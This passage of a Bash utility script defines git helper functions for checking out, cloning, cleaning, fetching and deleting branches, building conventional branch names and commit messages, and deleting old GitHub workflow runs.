    if [ -z "${branch}" ] && [ "${interactive_rename}" = false ]; then
        command='_pick_branch -m'
        if [ "${list_all}" = true ]; then
            command="${command} -a"
        fi
        if [ -n "${filter}" ]; then
            command="${command} -F ${filter}"
        fi
        branch="$(eval "${command}")"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------

    if [ "${delete}" = true ] || [ "${delete_remote}" = true ]; then
        _alert_danger 'Are you sure you want to permanently delete this branch ?'
        if [ "${delete_remote}" = true ]; then
            _echo_danger "This will remove \"${branch}\" from both local and remote repositories !\n"
        else
            _echo_danger "This will remove \"${branch}\" from local repository !\n"
        fi
        _echo_primary 'This action is irreversible : (yes/no) [no]: '

        read -r USER_PROMPT
        if [[ ! "${USER_PROMPT}" =~ ^[Yy][Ee]?[Ss]?$  ]]; then
            return 0
        fi
    fi

    #--------------------------------------------------

    if [ "${delete}" = true ]; then
        _echo_info "git branch -D ${branch}\n"
        git branch -D "${branch}"
    fi

    if [ "${delete_remote}" = true ]; then
        _echo_info "git push origin --delete ${branch}\n"
        git push origin --delete "${branch}"
    fi

    #--------------------------------------------------

    if [ "${checkout}" = true ]; then
        # if branch is not found locally
        if [ -z "$(git --no-pager branch --list "${branch}")" ]; then
            # find branch on remote
            if [ -z "$(git --no-pager branch -r --list "origin/${branch}")" ]; then
                _alert_success 'Creating new local branch'
                if [ "${interactive_rename}" = true ]; then
                    conventional-branch -i "${branch}"
                else
                    conventional-branch "${branch}"
                fi
            else
                _alert_warning 'Fetching branch from remote'
                _echo_info "git checkout origin/${branch} --track\n"
                git checkout "origin/${branch}" --track
            fi
        else
            _echo_warning 'swith to local branch\n'
            _echo_info "git checkout ${branch}\n"
            git checkout "${branch}"
        fi
    fi
}

## Restore working tree files
function checkout() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'checkout (branch_name/commit_hash) -f [file path] -B (pick branch) -C (pick commit) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local current_branch
    local file_path
    local object
    local pick_branch=false
    local pick_commit=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :BCf:h option; do
            case "${option}" in
                B) pick_branch=true;;
                C) pick_commit=true;;
                f) file_path="${OPTARG}";;
                h) _echo_warning 'checkout\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Restore working tree files\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Validate argument value
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${arguments[${LBOUND}]}" ]; then
        object="${arguments[${LBOUND}]}"

        if [ "$(_branch_exists "${object}")" = false ] && [ "$(_commit_exists "${object}")" = false ]; then
            _echo_danger "error: Invalid commit or branch name : \"${object}\"\n"
            _usage
            return 1
        fi
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ -n "${file_path}" ]; then
        file_path="-- ${file_path}"
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    if [ "${pick_branch}" = true ] && [ -z "${object}" ]; then
        _echo_info 'git --no-pager branch --format="%(refname:short)"\n'
        object="$(_pick_branch -cm)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
    if [ "${object}" = "${current_branch}" ] || [ "${pick_commit}" = true ]; then
        _echo_info "git --no-pager log ${object} --no-decorate --oneline -n 16\n"
        object="$(_pick_commit "${object}")"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${object}" ] && [ -z "${file_path}" ]; then
        object="."
    fi

    _echo_info "$(echo "git checkout ${object} ${file_path}" | tr -s ' ')\n"
    eval "git checkout ${object} ${file_path}"
}

## Clean unreachable loose objects
function clean-unreachable() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'clean-unreachable -a (prune agressive) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local agressive=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :ah option; do
        case "${option}" in
            a) agressive=true;;
            h) _echo_warning 'clean-unreachable\n';
                _echo_success 'description:' 2 14; _echo_primary 'Clean unreachable loose objects\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info 'git fsck\n'
    git fsck

    #--------------------------------------------------

    _echo_info "rm \"\$(git rev-parse --git-dir)/gc.log\"\n"
    rm "$(git rev-parse --git-dir)/gc.log"

    #--------------------------------------------------

    if [ "${agressive}" = true ]; then
        _echo_info 'git gc --prune=now --aggressive\n'
        git gc --prune=now --aggressive
    else
        _echo_info 'git gc --prune=now\n'
        git gc --prune=now
    fi

    #--------------------------------------------------

    _echo_info 'git prune\n'
    git prune

    #--------------------------------------------------

    _echo_info 'git reflog expire --expire-unreachable=now --expire=now --all\n'
    git reflog expire --expire-unreachable=now --expire=now --all
}

## Clone remote git repository locally (pulling submodules if any)
function clone() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'clone (repository) [-u username] [-s server] -b (bitbucket) -g (github) -l (gitlab) -H (https) -S (ssh) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local git_repository
    local repository_url

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :s:u:bglHSh option; do
            case "${option}" in
                s) GIT_SERVER="${OPTARG}";;
                u) GIT_USERNAME="${OPTARG}";;
                b) GIT_SERVER='bitbucket.org';;
                g) GIT_SERVER='github.com';;
                l) GIT_SERVER='gitlab.com';;
                H) GIT_SSH=false;;
                S) GIT_SSH=true;;
                h) _echo_warning 'clone\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Clone remote git repository to local folder\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Parse argument
    #--------------------------------------------------

    if [ "${#arguments[@]}" -eq 1 ]; then
        # get git configuration from string parsing
        if echo "${arguments[${LBOUND}]}" | grep -q -E '^(http://|https://|git@)'; then
            GIT_SERVER=$(echo "${arguments[${LBOUND}]}"     | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f1)
            GIT_USERNAME=$(echo "${arguments[${LBOUND}]}"   | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f2)
            git_repository=$(echo "${arguments[${LBOUND}]}" | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f3)

        elif echo "${arguments[${LBOUND}]}" | grep -q -E '^[A-Za-z0-9_-]+/[A-Za-z0-9_-]+$'; then
            GIT_USERNAME=$(echo "${arguments[${LBOUND}]}"   | cut -d/ -f1)
            git_repository=$(echo "${arguments[${LBOUND}]}" | cut -d/ -f2)

        else
            git_repository="${arguments[${LBOUND}]}"
        fi
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -z "${GIT_SERVER}" ]; then
        _echo_danger 'error: missing git server\n'
        _usage 2 8
        return 1
    fi

    if [ "${GIT_SERVER}" != 'gist.github.com' ]; then
        if [ -z "${GIT_USERNAME}" ]; then
            _echo_danger 'error: missing git username\n'
            _usage
            return 1
        fi
    fi

    if [ -z "${git_repository}" ]; then
        repository_url=$(_pick_repository "${GIT_USERNAME}")
        git_repository=$(echo "${repository_url}" | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f3)
    fi

    #--------------------------------------------------
    # Clone repository
    #--------------------------------------------------

    if [ "${GIT_SSH}" = true ] && [ "${GIT_SERVER}" = 'gist.github.com' ]; then
        _echo_info "git clone \"git@${GIT_SERVER}:${git_repository}.git\"\n"
        git clone "git@${GIT_SERVER}:${git_repository}.git"

    elif [ "${GIT_SSH}" = true ]; then
        _echo_info "git clone \"git@${GIT_SERVER}:${GIT_USERNAME}/${git_repository}.git\"\n"
        git clone "git@${GIT_SERVER}:${GIT_USERNAME}/${git_repository}.git"

    else
        _echo_info "git clone \"https://${GIT_SERVER}/${GIT_USERNAME}/${git_repository}\"\n"
        git clone "https://${GIT_SERVER}/${GIT_USERNAME}/${git_repository}"
    fi

    #--------------------------------------------------
    # Pull submodules
    #--------------------------------------------------

    # when cloning sucessful and ".gitmodules" file present
    # shellcheck disable=SC2181
    if [ "$?" = 0 ] && [ -f "${git_repository}/.gitmodules" ]; then
        (
            _echo_info "cd \"${git_repository}\" || return 1\n"
            cd "${git_repository}" || return 1

            _echo_info 'git submodule update --init --recursive\n'
            git submodule update --init --recursive
        )
    fi
}

## Write changes to local repository
function commit() {
    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    interactive=false

    #--------------------------------------------------

    while getopts :i option; do
        case "${option}" in
            i) interactive=true;;
            *) true;;
        esac
    done

    #--------------------------------------------------

    if [ "${interactive}" = false ]; then
        guser
        echo
        lremote
        branch -l
        echo
    fi

    #--------------------------------------------------

    conventional-commit "$@"
}

# Create conventional branch name
function conventional-branch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'conventional-branch (branch name) -i (interactive) -r (rename) -t [type] -T [ticket] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local default_subject
    local default_ticket
    local default_type
    local interactive=false
    local rename=false
    local subject
    local ticket
    local type
    local valid_types=(build chore ci docs feat fix perf refactor style test other)

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :irt:T:h option; do
            case "${option}" in
                i) interactive=true;;
                r) rename=true;;
                T) default_ticket="${OPTARG}";;
                t) default_type="${OPTARG}";;
                h) _echo_warning 'conventional-branch\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create conventional branch name\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Parse argument
    #--------------------------------------------------

    default_type="$(_parse_branch_type "${arguments[${LBOUND}]}")"
    default_ticket="$(_parse_branch_ticket "${arguments[${LBOUND}]}")"
    default_subject="$(_parse_branch_subject "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Find default values
    #--------------------------------------------------

    if [ "${rename}" = true ]; then
        if [ -z "${default_type}" ]; then
            default_type=$(_get_branch_type)
        fi

        if [ -z "${default_ticket}" ]; then
            default_ticket=$(_get_branch_ticket)
        fi

        if [ -z "${default_subject}" ]; then
            default_subject=$(_get_branch_subject)
        fi
    fi

    if [ -z "${default_subject}" ]; then
        default_subject="$(date '+%Y%m%d_%H%M%S')"
    fi

    #--------------------------------------------------
    # User prompts
    #--------------------------------------------------

    if [ "${interactive}" = true ]; then
        PS3=$(_echo_success 'Please select type : ')
        select type in "${valid_types[@]}"; do
            if [[ "${REPLY}" =~ ^[0-9]+$ ]] && [ "${REPLY}" -gt 0 ] && [ "${REPLY}" -le "${#valid_types[@]}" ]; then
                break 2;
            fi
        done

        if [ "${type}" = 'other' ]; then
            _echo_success "Please enter type : [${default_type}] "
            read -r type
        fi

        _echo_success "Please enter subject: [${default_subject}] "
        read -r subject

        _echo_success "Please enter ticket number (optional): [${default_ticket}] "
        read -r ticket
    fi

    #--------------------------------------------------
    # Set default values
    #--------------------------------------------------

    if [ -z "${type}" ]; then
        type="${default_type}"
    fi

    if [ -z "${subject}" ]; then
        subject="${default_subject}"
    fi

    if [ -z "${ticket}" ]; then
        ticket="${default_ticket}"
    fi

    #--------------------------------------------------
    # Sanitize values
    #--------------------------------------------------

    type="$(_format_type "${type}")"
    ticket="$(_format_ticket "${ticket}")"
    subject="$(_format_branch_subject "${subject}")"

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [[ ! "${ticket}" =~ ^[A-Z]+-[0-9]+$ ]]; then
        ticket=''
    fi

    #--------------------------------------------------
    # Format values
    #--------------------------------------------------

    if [ -n "${type}" ]; then
        type="${type}/"
    fi

    if [ -n "${ticket}" ]; then
        ticket="${ticket}/"
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${rename}" = true ]; then
        # -m, --move : Move/rename a branch and the corresponding reflog.
        _echo_info "git branch -m ${type}${ticket}${subject}\n"
        eval "git branch -m \"${type}${ticket}${subject}\""

        return 0
    fi

    _echo_info "git checkout -b ${type}${ticket}${subject}\n"
    eval "git checkout -b \"${type}${ticket}${subject}\""
}

# Create conventional commit message
function conventional-commit() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'conventional-commit (subject) -r (reuse-message) -i (interactive) -t [type] -s [scope] -b [body] -T [ticket] -f [footer] -B (breaking change) -a [author] -A (default author) -d [date] -D (current date) -x (add all) -X (amend) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local add
    local amend
    local author
    local body
    local breaking_change=false
    local date
    local default_body
    local default_pull_request
    local default_scope
    local default_subject
    local default_ticket
    local default_type
    local footer
    local interactive=false
    local message
    local pull_request
    local reuse_message=false
    local scope
    local separator=': '
    local subject
    local ticket
    local type
    local valid_types=(build chore ci docs feat fix perf refactor style test other)

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :Aa:Bb:Dd:f:ip:rs:T:t:Xxh option; do
            case "${option}" in
                A) author="$(git config --get --global user.name) <$(git config --get --global user.email)>";;
                a) author="${OPTARG}";;
                B) breaking_change=true;;
                b) default_body="${OPTARG}";;
                D) date="$(date '+%Y-%m-%d %H:%M:%S')";;
                d) date="${OPTARG}";;
                f) footer="${OPTARG}";;
                i) interactive=true;;
                p) default_pull_request="${OPTARG}";;
                r) reuse_message=true;;
                s) default_scope="${OPTARG}";;
                T) default_ticket="${OPTARG}";;
                t) default_type="${OPTARG}";;
                x) add=true;;
                X) amend='--amend ';;
                h) _echo_warning 'conventional-commit\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create conventional commit message\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # check git user configured
    #--------------------------------------------------

    if [ -z "$(git config --global user.username)" ] && [ -z "$(git config --global user.email)" ]; then
        _echo_danger 'error: Missing git default account identity\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Parse argument
    #--------------------------------------------------

    default_type=$(_parse_commit_type "${arguments[${LBOUND}]}");
    default_scope=$(_parse_commit_scope "${arguments[${LBOUND}]}");
    default_subject="$(_parse_commit_subject "${arguments[${LBOUND}]}")"
    default_ticket=$(_parse_commit_ticket "${arguments[${LBOUND}]}")
    default_pull_request=$(_parse_commit_pull_request "${arguments[${LBOUND}]}")

    #--------------------------------------------------
    # Find default values
    #--------------------------------------------------

    if [ -n "${amend}" ]; then
        if [ -z "${default_scope}" ]; then
            default_scope=$(_get_commit_scope);
        fi

        if [ -z "${default_subject}" ]; then
            default_subject=$(_get_commit_subject)
        fi

        if [ -z "${default_body}" ]; then
            default_body=$(_get_commit_body)
        fi

        if [ -z "${default_ticket}" ]; then
            default_ticket=$(_get_commit_ticket)
        fi

        if [ -z "${default_pull_request}" ]; then
            default_pull_request=$(_get_commit_pull_request)
        fi
    fi

    #--------------------------------------------------
    # Set default values
    #--------------------------------------------------

    if [ -z "${default_type}" ]; then
        default_type=$(_get_commit_type)
    fi

    if [ -z "${default_type}" ]; then
        default_type='feat'
    fi

    if [ -z "${default_subject}" ]; then
        EMOJIS=(☕ ⚡ ✨ ⭐ 🌟 🌶 🍩 🍬 🍭 🍰 🎉 🎊 🎯 🎷 🎸 🎺 🏁 🏅 🏆 🐀 🐁 🐄 🐅 🐇 🐈 🐕 🐝 🐠 🐧 🐰 🐱 🐼 👋 👍 👑 💙 💡 🔥 🚀 🛸 🤖 🤟 🥇 🦄 🦖)
        default_subject="${EMOJIS[ $((RANDOM % ${#EMOJIS[@]})) ]} WIP $(date '+%Y-%m-%d %H:%M:%S')"
    fi

    #--------------------------------------------------
    # Interactive prompts
    #--------------------------------------------------

    if [ "${interactive}" = true ] && [ "${reuse_message}" = false ]; then
        PS3=$(_echo_success 'Please select commit type : ')
        select type in "${valid_types[@]}"; do
            if [[ "${REPLY}" =~ ^[0-9]+$ ]] && [ "${REPLY}" -gt 0 ] && [ "${REPLY}" -le "${#valid_types[@]}" ]; then
                break 2;
            fi
        done

        if [ "${type}" = 'other' ]; then
            _echo_success "Please enter commit type : [${default_type}] "
            read -r type
        fi

        _echo_success "Please enter scope (optional): [${default_scope}] "
        read -r scope

        _echo_success "Please enter subject: [${default_subject}] "
        read -r subject

        _echo_success "Please enter ticket number (optional): [${default_ticket}] "
        read -r ticket

        _echo_success "Please enter PR number (optional): [${default_pull_request}] "
        read -r pull_request

        _echo_success "Please enter body (optional): [${default_body}] "
        read -r body

        _echo_success 'Is breaking change: (yes/no) [no]: '
        read -r REPLY
        if [[ "${REPLY}" =~ ^[Yy][Ee]?[Ss]?$  ]]; then
            breaking_change=true
        fi

        if [ "${breaking_change}" = true ]; then
            _echo_success 'Please explain how change breaks current version (optional): '
            read -r footer
        fi
    fi

    #--------------------------------------------------
    # Set values
    #--------------------------------------------------

    if [ -z "${type}" ]; then
        type="${default_type}"
    fi

    if [ -z "${scope}" ]; then
        scope="${default_scope}"
    fi

    if [ -z "${subject}" ]; then
        subject="${default_subject}"
    fi

    if [ -z "${ticket}" ]; then
        ticket="${default_ticket}"
    fi

    if [ -z "${body}" ]; then
        body="${default_body}"
    fi

    #--------------------------------------------------
    # Sanitize values
    #--------------------------------------------------

    type="$(_format_type "${type}")"
    scope="$(_format_type "${scope}")"
    subject="$(_format_commit_subject "${subject}")"
    ticket="$(_format_ticket "${ticket}")"
    body="$(_trim "${body}")"
    footer="$(_trim "${footer}")"

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [[ ! "${ticket}" =~ ^[A-Z]+-[0-9]+$  ]]; then
        ticket=''
    fi

    if [[ ! "${pull_request}" =~ ^[0-9]+$  ]]; then
        pull_request=''
    fi

    #--------------------------------------------------
    # Format values
    #--------------------------------------------------

    if [ -n "${scope}" ]; then
        scope="(${scope})"
    fi

    if [ "${breaking_change}" = true ]; then
        separator="!${separator}"
    fi

    if [ -n "${ticket}" ]; then
        ticket=" (${ticket})"
    fi

    if [ -n "${pull_request}" ]; then
        pull_request=" (#${pull_request})"
    fi

    if [ -n "${body}" ]; then
        body="\n${body}"
    fi

    if [ -n "${footer}" ]; then
        if [ "${breaking_change}" = true ]; then
            footer="\nBREAKING CHANGE: ${footer}"
        else
            footer="\n${footer}"
        fi
    elif [ "${breaking_change}" = true ]; then
        footer="\nBREAKING CHANGE"
    fi

    #--------------------------------------------------
    # Format command
    #--------------------------------------------------

    if [ "${reuse_message}" = true ]; then
        message="--reuse-message HEAD"
    else
        message="-m \"$(echo -en "${type}${scope}${separator}${subject}${ticket}${pull_request}${body}${footer}")\""
    fi

    if [ -n "${author}" ]; then
        author="--author \"${author}\""
    fi

    if [ -n "${date}" ]; then
        # format date to epoch
        date="--date $(date -d"${date}" +%s)"
    fi

    #--------------------------------------------------
    # Execute commands
    #--------------------------------------------------

    if [ "${add}" = true ]; then
        _echo_info 'git add .\n'
        git add .
        echo
        gstatus
    fi

    _echo_info "$(echo "git commit ${amend} ${message} ${author} ${date}" | tr -s ' ')\n"
    eval "git commit ${amend} ${message} ${author} ${date}"
}

## Delete old Github workflows
function delete-github-workflows() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'delete-github-workflows -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local git_repository
    local git_username

    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'delete-github-workflows\n';
                _echo_success 'description:' 2 14; _echo_primary 'Delete old Github workflows\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check gh-cli installation
    #--------------------------------------------------

    if [ ! -x "$(command -v gh)" ]; then
        _echo_danger 'error: gihub-cli required, visit: "https://github.com/cli/cli"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check jq installation
    #--------------------------------------------------

    if [ ! -x "$(command -v jq)" ]; then
        _echo_danger 'error: jq required, enter: "sudo apt-get install -y jq" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -n "$(git remote get-url origin 2>/dev/null)" ]; then
        # get default configuration from "git remote"
        git_username=$(git remote get-url origin | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f2)
        git_repository=$(git remote get-url origin | sed -E 's/(http:\/\/|https:\/\/|git@)//' | sed -E 's/\.git$//' | tr ':' '/' | cut -d/ -f3)
    fi

    #--------------------------------------------------

    _echo_info "gh api \"repos/${git_username}/${git_repository}/actions/runs\" | jq -r '.workflow_runs[] | \"\(.id)\"' | while read -r id; do ... done\n"
    gh api "repos/${git_username}/${git_repository}/actions/runs" | jq -r '.workflow_runs[] | "\(.id)"' | while read -r id;
    do
        _echo_info "gh api \"repos/${git_username}/${git_repository}/actions/runs/${id}\" -X DELETE\n"
        gh api "repos/${git_username}/${git_repository}/actions/runs/${id}" -X DELETE
    done
}

## Fetch remote branches
function fetch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'fetch -p (prune) -t (tags) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local prune=false
    local tags=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :pth option; do
            case "${option}" in
                p) prune=true;;
                t) tags=true;;
                h) _echo_warning 'fetch\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Fetch remote branches\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${prune}" = false ] && [ "${tags}" = false ]; then
        _echo_info 'git fetch --all\n'
        git fetch --all

        return 0
    fi

    #--------------------------------------------------

    if [ "${prune}" = true ]; then
        # remove remote git branches from local cache
        _echo_info 'git remote update origin --prune\n'
        git remote update origin --prune
    fi

    #--------------------------------------------------

    if [ "${tags}" = true ]; then
        # make sure we list all existing remote tags
        _echo_info 'git fetch --all --tags\n'
        git fetch --all --tags
    fi
}

## Abort the rebase or pick operation
function gabort() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'gabort -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'gabort\n';
                _echo_success 'description:' 2 14; _echo_primary 'Abort the rebase or pick operation\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Execute short command
    #--------------------------------------------------

    if [ "$(_is_rebase_in_progress)" = true ]; then
        _echo_info 'git rebase --abort\n'
        git rebase --abort

        return 0
    fi

    #--------------------------------------------------

    _echo_info 'git cherry-pick --abort\n'
    git cherry-pick --abort
}

## Continue the rebase or pick operation
function gcontinue() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'gcontinue -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'gcontinue\n';
